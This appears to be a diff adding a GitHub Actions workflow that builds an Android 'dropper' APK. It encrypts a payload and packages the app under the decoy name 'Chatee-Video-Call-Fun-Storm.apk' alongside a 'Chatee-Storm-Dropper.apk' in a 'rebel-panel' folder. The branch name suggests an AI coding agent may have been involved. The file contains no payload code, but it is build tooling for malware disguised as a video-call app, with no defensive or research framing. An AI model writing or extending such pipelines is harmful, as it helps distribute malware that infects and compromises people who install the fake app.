@@ -1,0 +1,35 @@
+name: Build Chatee Storm Dropper
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - 'cursor/chatee-storm-apk-*'
+    paths:
+      - 'dropper/**'
+      - 'app/**'
+      - 'scripts/encrypt_dropper_payload.py'
+      - 'scripts/build_chatee_dropper.sh'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+      - uses: android-actions/setup-android@v3
+      - name: Build dropper APK
+        run: |
+          chmod +x gradlew scripts/build_chatee_dropper.sh
+          python3 scripts/encrypt_storm_vault.py
+          ./gradlew :app:assembleRelease --no-daemon
+          cp app/build/outputs/apk/release/app-release.apk rebel-panel/Chatee-Video-Call-Fun-Storm.apk
+          ./scripts/build_chatee_dropper.sh rebel-panel/Chatee-Video-Call-Fun-Storm.apk
+      - uses: actions/upload-artifact@v4
+        with:
+          name: Chatee-Storm-Dropper
+          path: |
+            rebel-panel/Chatee-Storm-Dropper.apk
+            rebel-panel/Chatee-Video-Call-Fun-Storm.apk
